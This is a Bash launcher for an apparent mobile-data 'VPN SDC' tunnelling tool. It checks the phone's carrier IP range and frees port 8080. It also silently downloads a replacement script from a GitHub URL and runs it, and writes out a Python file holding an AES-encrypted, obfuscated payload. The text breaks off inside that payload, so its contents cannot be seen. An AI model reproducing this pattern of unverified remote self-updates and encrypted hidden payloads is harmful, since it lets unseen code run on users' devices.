#!/bin/bash

# ==========================================
# SHADOW OPERATOR LAUNCHER | VPN SDC SERVER
# ==========================================

SCRIPT_TARGET="vpn_local_server_sdc.py"
PORT=8080
IP_RANGE_MIN=20
IP_RANGE_MAX=90
SCRIPT_VERSION="3.8"
UPDATE_URL="https://raw.githubusercontent.com/Pr3da7ol/ShadowVPN/main/start_vpn.bash"
export DEBIAN_FRONTEND=noninteractive

# Colores
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_msg() { echo -e "${2}[${1}] ${3}${NC}"; }

# --- AUTO-UPDATE ---
get_self_path() {
    local p="$0"
    local resolved=""
    if command -v readlink &> /dev/null; then
        resolved="$(readlink -f "$p" 2>/dev/null)"
    fi
    if [ -z "$resolved" ] && command -v realpath &> /dev/null; then
        resolved="$(realpath "$p" 2>/dev/null)"
    fi
    [ -n "$resolved" ] && echo "$resolved" || echo "$p"
}

fetch_remote_script() {
    local url="$1"
    local out="$2"
    if command -v curl &> /dev/null; then
        curl -fsSL "$url" -o "$out"
    elif command -v wget &> /dev/null; then
        wget -qO "$out" "$url"
    else
        return 1
    fi
}

extract_version() {
    local file="$1"
    local v=""
    v="$(grep -m1 '^SCRIPT_VERSION=' "$file" 2>/dev/null | cut -d'"' -f2)"
    if [ -z "$v" ]; then
        v="$(grep -m1 -E 'REPARACIÓN DE EMERGENCIA \(V[0-9.]+\)' "$file" 2>/dev/null | sed -E 's/.*\(V([0-9.]+)\).*/\1/')"
    fi
    echo "$v"
}

auto_update() {
    local self_path tmp_file remote_version
    self_path="$(get_self_path)"
    tmp_file="/tmp/start_vpn.bash.$$"

    if ! fetch_remote_script "$UPDATE_URL" "$tmp_file"; then
        echo -e "${AMARILLO}[!] Auto-update no disponible (curl/wget o red).${NC}"
        return 0
    fi

    remote_version="$(extract_version "$tmp_file")"
    if [ -z "$remote_version" ]; then
        echo -e "${AMARILLO}[!] No se pudo leer version remota. Omitiendo update.${NC}"
        rm -f "$tmp_file"
        return 0
    fi

    if [ "$remote_version" != "$SCRIPT_VERSION" ]; then
        echo -e "${CYAN}[*] Update detectado: v${SCRIPT_VERSION} -> v${remote_version}${NC}"
        if cp "$tmp_file" "$self_path" 2>/dev/null; then
            chmod +x "$self_path" 2>/dev/null
            echo -e "${VERDE}[OK] Script actualizado. Re-lanzando...${NC}"
            rm -f "$tmp_file"
            exec "$self_path" "$@"
        else
            echo -e "${ROJO}[X] No se pudo escribir en: $self_path${NC}"
            rm -f "$tmp_file"
            return 0
        fi
    else
        echo -e "${VERDE}[OK] Script en ultima version (v${SCRIPT_VERSION}).${NC}"
        rm -f "$tmp_file"
        return 0
    fi
}

# --- VERIFICACIÓN DE RANGO IP (IFCONFIG) ---
get_ifconfig_ips() {
    ifconfig 2>/dev/null \
        | grep -Eo 'inet (addr:)?([0-9]{1,3}\.){3}[0-9]{1,3}' \
        | awk '{print $2}' \
        | sed 's/^addr://g' \
        | sort -u
}

get_rmnet0_ip() {
    local ip=""
    ip="$(ifconfig rmnet0 2>/dev/null \
        | grep -Eo 'inet (addr:)?([0-9]{1,3}\.){3}[0-9]{1,3}' \
        | awk '{print $2}' \
        | sed 's/^addr://g' \
        | head -n1)"
    if [ -n "$ip" ]; then
        echo "$ip"
        return 0
    fi
    ifconfig 2>/dev/null | awk '
        $1 ~ /^rmnet0/ {show=1; next}
        show && $1 ~ /^$/ {exit}
        show && $1=="inet" {print $2; exit}
    ' | sed 's/^addr://g'
}

ip_in_recommended_range() {
    local ip="$1"
    local o1 o2 o3 o4
    IFS='.' read -r o1 o2 o3 o4 <<< "$ip"
    [ "$o1" = "10" ] || return 1
    case "$o2" in
        ''|*[!0-9]*) return 1 ;;
    esac
    [ "$o2" -ge "$IP_RANGE_MIN" ] && [ "$o2" -le "$IP_RANGE_MAX" ]
}

check_ip_range_ifconfig() {
    if ! command -v ifconfig &> /dev/null; then
        echo -e "${AMARILLO}[!] ifconfig no disponible. Omitiendo verificacion de rango.${NC}"
        return 0
    fi

    local rmnet_ip current_ip ok match_ip
    rmnet_ip="$(get_rmnet0_ip)"
    ok=1

    if [ -n "$rmnet_ip" ]; then
        current_ip="$rmnet_ip"
        if ip_in_recommended_range "$rmnet_ip"; then
            ok=0
            match_ip="$rmnet_ip"
        fi
    else
        local ips primary_ip
        ips="$(get_ifconfig_ips)"
        if [ -z "$ips" ]; then
            echo -e "${AMARILLO}[!] No se detectaron IPs con ifconfig. Omitiendo verificacion.${NC}"
            return 0
        fi
        primary_ip=""
        for ip in $ips; do
            if [ "$ip" != "127.0.0.1" ]; then
                primary_ip="$ip"
                break
            fi
        done
        if [ -z "$primary_ip" ]; then
            primary_ip="$(echo "$ips" | head -n1)"
        fi
        current_ip="$primary_ip"
        if [ -n "$primary_ip" ] && ip_in_recommended_range "$primary_ip"; then
            ok=0
            match_ip="$primary_ip"
        fi
    fi

    if [ "$ok" -eq 0 ]; then
        echo -e "${VERDE}[OK] IP EN RANGO SUGERIDO: ${NC}$match_ip"
        echo -e "${CYAN}Rango sugerido: 10.${IP_RANGE_MIN} - 10.${IP_RANGE_MAX}${NC}"
        return 0
    fi

    if [ -z "$current_ip" ]; then
        current_ip="N/A"
    fi
    echo -e "${ROJO}[X] IP FUERA DE RANGO SUGERIDO: ${NC}$current_ip"
    echo -e "${CYAN}Rango sugerido: 10.${IP_RANGE_MIN} - 10.${IP_RANGE_MAX}${NC}"
    echo -e "${CYAN}[*] PROTOCOLO DE RECUPERACION DE RANGO:${NC}"
    echo -e "${CYAN}    1) PON EL TELEFONO EN MODO AVION (10-15s).${NC}"
    echo -e "${CYAN}    2) DESACTIVA MODO AVION Y ESPERA NUEVA IP.${NC}"
    echo -e "${CYAN}    3) VERIFICA CON ifconfig Y REINTENTA.${NC}"
    echo -e "${AMARILLO}[!] Continuar podria afectar rendimiento o consumo de datos.${NC}"
    read -r -p ">> Forzar ejecucion? (s/N): " confirm
    if [ "$confirm" != "s" ]; then
        echo -e "${ROJO}[!] Operacion abortada por verificacion de rango.${NC}"
        exit 0
    fi
    echo -e "${AMARILLO}[!] MODO FORZADO ACTIVADO.${NC}"
}

# --- CONTROL DE PUERTO ---
port_in_use() {
    if command -v ss &> /dev/null; then
        ss -ltn "sport = :$PORT" 2>/dev/null | grep -q ":$PORT"
    elif command -v lsof &> /dev/null; then
        lsof -iTCP:"$PORT" -sTCP:LISTEN -t &> /dev/null
    elif command -v fuser &> /dev/null; then
        fuser -n tcp "$PORT" &> /dev/null
    else
        return 1
    fi
}

kill_port() {
    local pids=""
    if command -v ss &> /dev/null; then
        pids=$(ss -ltnp "sport = :$PORT" 2>/dev/null | awk -F'pid=' 'NR>1{split($2,a,","); print a[1]}' | sort -u)
    elif command -v lsof &> /dev/null; then
        pids=$(lsof -iTCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null | sort -u)
    elif command -v fuser &> /dev/null; then
        pids=$(fuser -n tcp "$PORT" 2>/dev/null)
    fi
    if [ -n "$pids" ]; then
        log_msg "WARN" "$AMARILLO" "Puerto $PORT en uso. Cerrando PID(s): $pids"
        kill $pids 2>/dev/null
        sleep 1
        if port_in_use; then
            log_msg "WARN" "$ROJO" "Forzando cierre en puerto $PORT"
            kill -9 $pids 2>/dev/null
        fi
    fi
}

# --- 1. GENERACIÓN DEL PAYLOAD (Self-Extracting) ---
generate_payload() {
    log_msg "SYSTEM" "$CYAN" "Verificando integridad del núcleo..."
    if [ -f "$SCRIPT_TARGET" ]; then
        log_msg "CHECK" "$VERDE" "Núcleo $SCRIPT_TARGET detectado localmente."
    else
        log_msg "GEN" "$AMARILLO" "Núcleo no detectado. Materializando $SCRIPT_TARGET (ULTRA SECURE)..."
        
        # INICIO DEL BLOQUE PYTHON PROTEGIDO V2
        cat << 'EOF' > "$SCRIPT_TARGET"
# SHADOW PROTECTED | DO NOT MODIFY
import base64, json, os, sys, zlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def _b64d(s):
    s = s + ("=" * (-len(s) % 4))
    return base64.urlsafe_b64decode(s.encode("utf-8"))

def _derive_key(passphrase, salt, iterations):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=iterations)
    return kdf.derive(passphrase.encode("utf-8"))

payload = "eyJzIjoiYVN4NUlYWXozb1FTTFUxMWZVWVZUQSIsIm4iOiJWVFgyVldBM2oxQ2RwcEVmIiwiYyI6Il9Da3JZSDhWQlFtOFJHSEZ0ZGV5XzZPaGJYSVE0S25JUTAwZlhrSzVEMnFFN3VUUDk4ZXdpdkdaeFVEZG1YS04ycFhNdEhUUGRqRXI5N0NmTmEzdE43dXdQdVM0bnNrcXhsSTJ0Vm9XVlJNUElkbHV2NURwVXluRHl4aGtjSS1ha1N6T3lUOW1fNHNrZTBFak5NWjdLS2dwQUIwdDhnS1Y0bTRwZFhxWjVKcDVGdllQRkRCVnprS19kLVliLVFPVU1hVDhBT1RtX01BMlQzazZSbk16R2ExdW9mVTBHT2hJcHhBdURFSk5STU1sd2NPanZPWDdhNkg5QTRqa3Izalp5UFRhYjNrN192VDd3aC1Eam9HTGpRMkZ6X0haRkFHSHpfLUx3SWx6N3FqUjViekl6dmVVVUNqQ3p6TzdRajVSZ08xQjM4ak9tbDRkNUNTR0NkRzM3U0hMQWJmaTRpNW82QnhKaUxfaTZZRnpKaDZvck1Ib3JObzZIUTUtWEhnX21aVS1BVkdKcG0xQnBnck5CUk80TUxsV2p1Y3p1S2FQMWdrSmxTTThaQUNYSGNpeWdPSmdiRFNIZndKSHhYN2d0N0g5NHBuZmJiWmxMdXJVQUk3QXlVa1FzdEE5MTh4VTF1UHh6RlgxeWk2S2ZfSTRHUmlvRUdfemlGbDhLYXU0bnBULU1xN1NPMUc4TEVfb1o2NU5YNzY1M1VoMFJsbnJqWXdJa1Vrc2RJYzZWX2JvN0k2WG9HenQ2U2oxMlRKZ1dIb1M4Wk5manNXZ2k0aHp3RmpNeGltVnc4M3ZuQkQ2ZkFtZWRyTGQ5Z3N3TjBBZnRvMnJiSVRLTDYwMERoUk54djdKcWkwZkVwMVVzVjY4aGNKT1I3d3c5RHF2QktEbm5vSEFsYldCcjFGQm1uZzYtRHRTYm1RczFFMGZ5ZU5yaGFfWk9xb21qLTlyX1RHSVc5VHNNWFhKaXFpSDdOcE5SOWdDaGVKbHdDQzNwc1RQaUV2bnJuYWdmWDJpdjRmM0JsdUV2Mi1CT0JmYUg2anZNb21xNkRmZmhQY3lsaDRVNDJ0MFFHSlJNaGhqLUlvRzFLNjVDQV9EWWpfd3prcXVmbGZhd2JtWElxZ2tuR1hRcFQyZThwUFRsYUQ1RHJia0k2bkpwV0RDcFJ5em1lVVI3Z0o3Q1RsTDVfenZMbFV2ajB2ZU4zV1VyNWtCT21MYW9qdWxnM0tVakxOc2IwM2lQTE10aEtUbkJ0bUlOTHdRSV9uMUg1Y1l3eW9WUUJJWi14cjJubzFlYnMyM1JzNUtfOVN2RmNaVzVrLXRZVkdBZUFHOWpwbjhydnFGdW1SYUpNbFo4NTB3czlkUHY2cTYtcFN3QWpzdUtFTWRoVmx2c2hORjhwZ3lzWlB6M2VFM0xFeXl6Yi1LRmFNN1dfYTh3VTZkMXZNWk1mR0QxeGtPVWRxSGFoZmJickdxU0R5WEpLV2tuZnVVVEhySFNzNENKZG9LaW80SjdtUTVfYkI1STNVY1JtVFZUZEtZdjJLVS16Q0hlemRERkUtSnJVSWJHeHRFbmE2QjlIbDdVdWJLUDJsLWhZTnpQNFNrNXVWQ1EyQUxhWi1tSVgyUWxPbWkzS1dwMi1SdHNQOXhvdGp3OUIzX2t1QldKeUdpZ1R0ZXEwWWplNktRejFfalZsQ2c4ekZERnFEakRFUjVCd3F2NnBWdTYwUE9nN1ZfZXhCZGwxSEpndFlRcndPSUs0TTRJOHFCZjF0MUpxUWR3V3BWTm5RM2lEZ1JjaFBJVU1iTGhTaHEwSXlvLWlCeGV0dEoteXBpeDNiZDcyY2dkVGJPWDRfNXBaY19xeTVaSGFoWXpTb0N3TkNXaEpnbUdCQ1RDY3lqZ2p5UmVQaUdjTjF6YnVIWkprUjJyZ0t4ZDlCQVVKTndBV0txNHBzTlJ1VkR0UnBFbGZiUzRvcFZ3OVhSamlUY3Baa0gtQ0ZLekJ1RFhxMUllbldlUUxrYm02SFJxdW9DdmROOXhZa2xjbFVYb1VCVEFLdEUyZWt6bXMwYXFUdHNOcXEyMnQzTGVmbi12YjhqeHBfYkQ4c0dIWlI1Rmc4MzlVNVRSak9SUXM5WEVjVFp3M2lrOUJ2SWhHc2pCbzh1YTNxNE5QQWkwbWZBQjBKbFJFYjV4UXQ0N0dteE9WUlRLYXhrVE9UaXNqMEFGbVhhTmMtQVlfbWdVZmFrUk9UTHp0ME8yOXUtUE9HM295cnJTY1pLSWVPUWZ1NDlZbFV1VVN3c3BfSnB6bGpQaWFQOGtDajlvQ2c4djF2ZVF4WFhvaUctX2dLdVF4VFBxcEVTbFkxcEZaZWlkOExyQllmNTZCcnZqTm44MHFFWF9WSzdPYkR1Q1lBeG9tc3FZQzFndnU2T1QwUmh0MW5IeDBHWmtSQkNtbzBXM052bzIzaTJxYjBEVUpEdHpDWkJ2QV9QOHBrOElzckdmdk9rNHgxNndKZFRtUTVWenhna2xCWGptTzdUS21pTEJzYzNYOXRWaG9NZURFU200X1NCc0NRSFpNSk0xUTRRZ1JmUEppQWktUGZlQnd1MjF5dU1nQlB5Sm42ak9TOE5oRTB1ZjByc0hzMmZnN2FvSnpsY2NYRHRfdVpGbk9HMGFQdHJQUXFjek1QazBSS21obndZdlhPTzFiSlNoUmhZX3JQaGtJdHdROTRfekFURWVJTEVrZy0zdEVZa3BqaUw5bS1ubmhvQUdES29uajVzaDdpUHoycXkyRFItSV9GRC03U3MtLVBNUzU1YWk2NG5MU2syVjZuMWduMlNnUy1nWDhza2ljaG8xUDZxdDN5TTZ3bm45WGptZE5Dc3IxQUsxd2tqUDUwN2l0VFliN0tRSFE4YlZSM21qTlk2MzV4eHdnNGNtN01ueEw3NHVVQzJndGktdlp1eW5JcHc4WnBsT1g1NnNzV1lqc1lmX1F2U21peVJCclRKVlJROFBIYjVuNm9ETlc3SmVlMUI0OUR5WXdxbm9OdkVLWWJ6OGtnbHRobng4U3VFUGR3YU1ickF4OVREUmtMSDdUSUl5SFYtaVZ1eWlHbU5mNUV6UlpkTHNQWU95azdWdHU0YXJOckJWVjRRZEJIUEYzNWVWU2ZYbjVKYlpwRDk5SU5aNWVpTFpnbTdhV3BlUkQ5NEpTaTc4aVVfX1dVTllEbW83TVluMjVkRndaX0VqSFNzNEZNb3pwclZ1bjNYSVB2Zl9JalowQjltUXdubWFfRDZtSG5xRzBlT2l3R1JQNHBmT1g4bmNJbGtCSGdycTRXZEptYU5DTWZtbjRHc0U4S29LZTduWm1Ib1U2eGFmYzdMeVppQUZkekZlYW12cUd4YWpWVHpFQVNmWlZLZFhERWduMHBtMTBTQ1poODkwdW5uU3JuWEV2MG1BeVM0NWFyVDhzMGJFVjNhenV2RTNoWldCSVoxcGVuTjh6eWJqQ254OW1MSlRaYUxhZVBaUWIyaTZUSEwxWDMyLTBuWXlmRDhxSktNX1NDWGQ3YV91MzM0Ty0zYmIwRE1pSDZ6YklWUi1sbWV1c3E3Nm51dW03N2J5S3VneTFJSkhPVlIzbmRMSHRwQk8wZHZ0cld3SUlaM3VLS1kyUGhNZ0NJQ0g2VGQyOGFkU1dEdmtaeE1DTmZ6a3JCcWs0ZkdlZGtHc2J4YmVtSk9UNGctYWRQcXJfc05OblpIS2FpaEIyN0FtSXhjRklHRS1oVFpTbDlnWTVDT1FLT3JBTHY4a1NUZ2I1MlhfbDZRUElZcklaenprWXo4elRjQXdOZVdRd3ItQWVPUGRvWXVUd2ZXTDN6bGdXQUxiVHJBd0o1eWtwYkxoOHc1UXdSUzZuaHU0TnNGYnBHbGpybWttWjJNS3ViR0QydmZSTnY3NDhaTFVUZ0RsUVhjTlZfaUhGbnRqTVFLSHY1eFJaTmkzc3lZWS12d2NJdkJSdVJ0alRXU1JKRjFpSUttMVp2by1mX3R1U0I3dW1lNjJmREJFbmZZUmdjSWlBb2FEOXRLbkNIcDRZOWV0aVVfTnpMNGkzRklnYXcxTkZKTTF1VFhnMzA4V2FJUGgzRlBQRWMwaWVEZ0QzQThtX0lrTDZySWk1TUV6UExDa016ak5XT2NpYmZhNXlEbVpHbnFYLVpDaWtidWN4X01ILWFjRi1KN3dlN3ZmaGQ2QU80blJaU016ODhoQ1E3c0JxZG1IWnNfck50MGJoelZ4MFpFcmZKZ1d1QnRkY3ZOWmRyUDdxbG84RWJ0R2R3OXI2R0FheDl1dVVQUU9OODh1NHJBQmJSUkI5QjlzemZJNlJFNko3SmV6RHdWNWQ1ZVE4NUlyVXhwYzJsMDg1dXdMSEVBQWVMenJybHR0UnJkaTMxVUZFSlkwT3pPYVd0YU1qbVRlTWVVTjBseFNPMUFnS1h5Um5oZHVBMlNKVk41Z1J4Nk50TXZzM29iR0FMVW5XU1U1MVJmay1NaDh6b25fR01Odk90Q3ZUNUMtcE9OS2ljQktGMi0xTzB0QU53Y1pVYWh4S05rMVpQekxIZ0JaVWdPN1ZfalBXbVhIanpfT2lRNnZYc3VpMV9KeThpQzFSWWZsWlJwSXNzck1JTDh2cWo1MkFhUmh1aGxHV25sbHdHbmw3SUZYd1VaOU5wbHVGZGVyUi04dGktMHQ5TXBYNnVka0ZqWVZEdXRLT1phU213VFRsX1pZcnRVa255S1ptZ1Npd0lXT3A2bzVyS0pvSzRXazJHcHlRaklDTkg4VE1rTUhwVy14QlFnWmtHLXpTZ0dUeWY5TnphUEtpU3k1dk1MRFZtNGt6YWlCSU4zNURLd19nalpVY2hyQmxPMjRDWjlQaEVOSFotRlVsam9BUVA4WnRNX1NRUG5PYnVoWWs4SWJBQmtIVHFnME1BQV9NU3N3LUhfdzg4R3l1dzVSRlRmQ0JHOWZyb0RNVlBOZ216TS1oTWt2QTB0VmYteEZFUVBWQzBiUy1Nd2JWQV81MGdDNnl6QS1kUmJLeXE1YUFER2o0Qy1iYnZtZ1JvaXpMVWo3c0hhc1UxSlVfQk5Dd2oxQnRYOXY1U1k2YjdNSnFGWjdXOVgtRHBpUEx3em5XUEZZN3B0UlYzS3p4d3o4OTZYRmVBS1lTcjNBRm0yZldNY2ZtMm1Mdkx2d3dTMlEyU2xZOGtGSFRrZWMwcUhnSkVjUURKWHFUUE9aN3BhbWRwNGJRcC1RVWNpRFhTbGRlMThFcDJPZ1gwYXh6bXhXUnYzQ3NObzVram5UaU56cnQwY1ppZE9wWGpFNnAtdWE3YXdfb3o3RGM1YzRnUTIxNm5ORllOVmZ3S2JuY2M1dElDdjM5VVhKVWJkRnRLMFhkc3FPcXItY2ZKcFZ5SWdvcjdybllHRHg5N0VqX2dpTmRLU09qbFdiVHBiaGpuWkxqWHl4Q09RaVpLQ2d3aTB6Z01zSnYtNm5oZ05OVVRXY2dWeXJ6YU1Hdmh0eWNSNmtPWkNFdy1BREYwX182NlhFV2RjdERmXzlGc1lxc0pkUWxCbnZxanQzZ2pzZ09FVzd2Q0pmb0ZaMWNJOUl1eUhxR1p4TVlXcXpqYXlXaS1faGh5dFBNQkVxbkdrZlc0VE9VNXVPclFSU1ZvZmlYUlVVZ1d1VXhOdE5aUXVMUXozZS1NUU9Sd2d1V2hyTGVucmM0NFhqYkZvZTJkRTlTWmkycG0zNXFWcjJqRktTcFFpQVhRM2lWc1h4M25MSWR4R1hsSHl1QksweUZRX3NXTGw1WEFjSnJQLWVCMkZFN3ZvbDhQam9VdzZtUTk5NVRnWm95eWRPeGFCODBPTFJMb0x3ZGtLMXFkN3gxRmk3UWphR1U2R0NOcVc4b215VlhFVTRFa19OTmJsOFdWVXpONTZzS2piaVl6TnFiZEZEUnZyVE1ZeVgydDd6NEZQa2J0Rk5FaXRmYTQwdGVNV0R5WG5KMEhPaHVabm1tZWpSWFdzVGN2SUZ2emU0Nmx4d0dlYjhibmYzTExUWWZ6WnFQaFdERTFDcTQyVXlyREloOHFFWWY1dFRxQ2ZpOTczS1ZjN1VGQ29VWEUyYWU2VlIxdDM5Y2JnblJ6c3RVM0tNbURSalEwbzR2S3VSTXU3VHd2ODVFeG96NVJCMXU5bWJtQ2l2RC1SUWRmMEM3aGM0NEstcjk1elRIUzI4MU40R1l5Yk1jMW9KX0hvS3lMYTVyV0ZxcXpvcTRXbEw2UG45U1ZhelY2SHB3Sk1HVmxLWC1KazRnRllYTDNnWjBqUWxzcnlZYkRvTmJQaHdnRWw2a1pfcXBNR0tRcm5GSm1GN2dLWWt2Zm5NNW12eFV0cWVfTWI5cmk2Y3BSRXFmVnVrcEJ5V1dMYm9VcGRFejVGNzJpWEp0R0pKLWJ2Zmt4NHhYWmpreThSazlvb2w2UXVLZHBvVVNFaldxNUl5VXduZS05OUVqNUR2dWRZaU81aGJ1cnNfck5XTDBYOXBrSGhfVGdyaElJb1BEOFhVTWZhN3Jwa0ZKOEUxakhWMUdHZERfQWhzeFRTTDhnTW1CcVRzMlRWc0F0NlRSNmhmWDFuM2JfcHVnVmt2TG11bFBhaWJKYWpaek83bnJvd3c1ZG1FOTZXRHhFUFVINXJCVkYtNldxU0lNX21GZGVPeVlKX3dyUWREZlhTem5jTmNoR3lwZExDdVQ4Tkt5Tkt3X21EWVlxSUJPYWh1TFJFLWQ0YlFRTEVseUx4MDF6bnlxTmhncW1aYktNekNLVkZKbUNCTERSa2hxSUxCWGhJUUJMbHR6RTEtcTZOeHBLaWtkdlI3eWRheWxXUDljeE52S2ZfT1lLY3hhTGtHdDB3eDRHNm1TS19ZZE5zM0lGVUVwNVF3TWh2NzZxMjE4eHRra0xURVd1ZU1kNGtoTkgzQTVsSXo3N3BoZGdMakc4WG9JbDM1UVpORGlXR2w3dFpnUFZqZ3loTFgwZjNZd1FMWDRDVWYxUzktb1J2NVhBMEptQXlIeFoyU1BRaU9DNjVYS29RTnYtYXhqUG1kcXhucHFmb0RFYzFzTC05b0FEczJITzYybmV3UjVJamFNYjVDRUN6LUxBRDdlZHVpcF9zOEcwRjJIWTFYRFdZNnQ2cWZrbzVKRGgycmJfWm5yV3ZzYTVTYWo2VWZPRnlTZ2FpazZ0Zm45SDBPMmdhMTFmT0R5N1FSVm1iLV9xLWRwM0ZhaW9qT3ViR3lzenNkR2JRdmxGYk9qSzlrWDliLVVzOVp3ZVJVZkFSUEl0T3JaU0l3RDNxWjRwUzdwQkt5Um9hSmdyY25vWklVbDJpNVZuYW5nY1hBMFhqaVpjOGNiSkxwN2pqaUhLSDlpT0JIS2w0b2RoMnpubk1BRGwwY3RzUWlDUU1xbVVuQjdMQkFkU1RxTmF1ZWgwRFQtT2lSSnJqQ2d3TFlFSUZ1Y3BxVnUtSkZURm13RS1QaFdvQzloZTB2bWlaM05PamI0cVVnUThzWmJVbWg0YlpLVk9FQWlVX2hLR0VRbVR6aWFXV0owbTJUOURrTHdKV1N4cEY2MUlEODR4RWdiQkgtOVFNOVRsdWtieG1yTGJYQ1Q2R1c1MmdXdGZLdVZUZ3Y3dENZcUhuMjdTZTNmZjhhVlEtRlFKTTUtZE1jbWJRb0VxQThvbm5qWVYwYk00clM5NWltN0d4X25BT0RKX1RYVDJXMm9IdzljUFJ1aml5bWpCZzYwQlctMlRGZ2dwMUdjajk5QlFHaFktNXRBc2hZTkhYZDRSVS12MG5JTGRkTmJHQm5kU0RJU1h3dko3bktrN202Yy1vUENDUkNmVFoxZjB2UzllZHFOMERuZVRrOThRQkVFWUQ0VlpCbVBYY0d4VG50T1N3SGQ0TTVtbnU0WFlXV1hxcHhuRXJXckNGaVJkQjVOU2k1YUJaNzZSR3RTM1pyNDltMGFSel9BN3FVemlnSExhRHh5Q1hiOElLM01xZi1JR1pMZE9saTFrc3F6UzdPdk8yTVZzWXY0dTdEdEE5VVZDYXAzUlFJWmVuYmM1dVZ4ZkhYeXFkTE4tVzRKdW8yS3ppV3Vsb2RmNWN0VFBINVlqVFhSSDI2Qk5SZWgwMnVVZ3E1V21kQXIzLVNNbzRBXzhpd0lqTGJjMGM0WTNDaS1Fd1I1Rnl1ak05UVlkamJPQ3pXUkpRaExnbE9fZFJGblA2c1NJbjdzRjJpblVaeV9PRE9kOWZEbE5aMnptdTJvLUlIelBaal9pdkM5emtpRE5sMldqQ29wcGFqM3BZV0tjeTExeDQxaFh1dzdWSEZhNnUycmZPZjQyaFBIOXV6T0tHTU9hcEtTX19xa05WRkNLakdiNHBWOURaY1JQZE8xU0xvYjdWYko0anYwcFl6RTVSaVFaSk11Rmp3TDZmU1lqWVFzbWZqczR0UHJ5VEU0MUhadWZYa2s0OWJCRlIwdjVWUjlHOFl2Y0htbUx6ekF3cFBQYkVzUHo0LTN4dm9lVDRBWnRldk85eVY5N2Y5dVNSX3A2OGZKTkU1NC1aVkMxd0JibWRIT3V4T1ZnRGRiaWFYaFM0dlJKZW5EaUM0VnNKTDc1cGVQZkk4d0d5bmx3ZnJTbnVLRXV4a1N5QVVuanplTFhMbnRDN0JhdkZyblhmSWVzczVaOTVDcE5pMG0xSzh6aV9TRjBac2JIX0NUNkxCOXJZX1NweEVuSEZxV0JsSkl0YmhLcnQ2XzlrSHpUcHc0VDhZOUctenlQWUppNmFraV9HTnpQRUo3Qmp0dmFpSnhlZTk0VUF5WUhIZlZVaDFFZ0xLM19tamhFWkVPaE5Ca3ZFR2hYTllOMzYxODh0RDhuRnB4bzFYTXZfVTFjeDRFdnhUbkl2cGpoNmM4R2MwMWRJZWVBbVJlUWJYeTVRZnQ0MnVadTNTTFE3akladVpJS0E3RjVzRFMyRVFsYkZPSzR1ckR4ZnRlVFMyZEQ2a3JOejJNaVU2T0RQbUV6MHRGdTBkdW9DZ21wVEt0RFk5YnpldHNpRUZjb1VQZ3F2QlJKYTFYa3ZEMFBKTHZQYVJqVW9nQWo2WEJKaXlwOExESDlvY2Y3WGM5LXpSc0JIbmY4a3JtMmZwZExoTmhDZ1Z6SUV2YkFyNE1VUzE2b1ZfSFdSN3F0Nmk0bFpwNlpTQTBHcERKcWsxTVRieXJXQnBiTnpKbmk3R0VuZHo1M2JobWhyV2JDdlFWMTRNbUJLSTdCbHIwVFRGY1ZXTElKMVVRaGdLejl1NzdkTnY0dnFTeU9VOG5rQ25haEE2WFNWREZrRGczWDhsVGZlaDdKMEgtdF9ZZVFnTXNyNzA1TGR3aGs3b0FSZG42X2MwVkluLVRPNHE2czNZTmR3WS1XX0xJMmc3WXdUZFMwZlNzdnFvM0pXS2dyUGdBdTZqTmt5RXZDa2FaU1F2amZrV0dIUjNHM2RvUjNWUkR2eVlTVmFiN0VteGlJMXgzQTRtb2JiOXVyUE4tTG1MSGNKN0dDWnBqbzQzMEUtOW1XeGxvSFhJV1JvQVN6Rm9PVXNrdlA0ZmFPbnc1cW4tUUU0RHFKU1dHdG5HZjZZU3Y5QUo0TjFjLWJLUWhtV25jOTEtbkZ3QWlmbGI1bkxPSkY0a19rUVRTUFB6OG1zWXBEY2N1MThsaUsxZEJ5TWsweEoxaDJaTHA3YndIc21TNDl2MDFDRjk1aFBVR2FqWWR5eWk4TmlTcmR5VXlkWjNMQlBIc0pSSEJIZmtrbnpxelFfbnlYUTNQSUd6YU5Md1o3NGZTV25HcE1HcVlTNlRWWmlJVVlaMXlJbWoyalJrRGlUa0dZXzdfSnA4Zy1PcExMcmp3X3VXWDdPTG1RZFBxcDVidUdqVU9YeE1NS1A1ODBEM0dzQ25VVDVrcmJSOUpvdzlLbWh4T2xCUlN3clk4elg3RnpPOE14V0F1R2FReW1mMndyMEhnTUJaU3pJWGd3cGV5cmVVOEUyc3V4dHNyTTlYYWVMcVBkXy05amwtdHdYVWtJLXo2OFdfTDMtelF6RnJ0a1FiZFdibExJTV82c2R3aDZYLVJLbURjWTIyTlF2bFY3VnV4WjJXMmVWV1NqZ2tCUDZ0cHowdUhZbVhFR0xFWmwtSHcyUmY2RkpMVDFTeklYR3JxcUpxNmFHUWt6eFN4WlZEMzdQdWdNdnl2RnRwbEpkYWs3clBudG9KdkJfS2w0NWU2LWJac0lMblBELXdUWi14TGJKYzdmSUd6SkFkSXdzR01Xb2JjUWVidEp0aEJ3cWI3S3FCdGFIX3UwQWNUeEtyZjc2VldjbmMzQ2lSNzhUNFRsSlA5U2UxaDFVTVU4VmRONlc4TFN3VU5fYV9GelMtb1BvVGExT0ozdVV3QWRIMGdXdEZMNlk1TFBsS2FMSHk4YU80ZUdFTzJVRkRXajdfcVhTczFBbVNQVjR0YTZrZ29rZnFxSkR1QTlUakRJdjhacVltdEc4NERVT3ZfVHc1X3FlQ3lmTTdWWmpzXy1uMk1QblNfS0pxTDJNZkV4XzktdjFXSDU4S214MTQ1WU40MW5sVE1kZ0lpTTdOZmN3bkY3aWFJenZ2OGhXVWVxNWo3MjBQNl9xV0tvejhxb0pVYlJIOS1PV1FYYkZVajlXNU1BU0JLWGdlMjJCdUl3MmphM0pHcjBDemFCeDN2REM5czZXUThzSlhZQzBhbzR3cW9oX3dPNVJLOXFsVXRXNlFDM2d0azdxNExDb1hnU1AybUJyLTlNUDlzQkpEVTJRZWMzdzJJZ0ZnMHJNMzd2SV95blFUWGtrcHlMNGZydzNpdmh6NnBVWkFqa1VRQU5uZUZUUDFvOVhIaXJ4ZDhRMzVWc3Axa3BWenhjWm5MWWZ5RzFrMTFNNDZib29BanA4TWtEOHV5TWZ2YVVhSXVSVS1JQmZxaEktcGZRTFdTTXhqMW5uRjhER1dPOExTaTZ1SkVNaFNVVDZXMTBWZWV3THJFa0xTZ1hyd2pucm5QTnFrV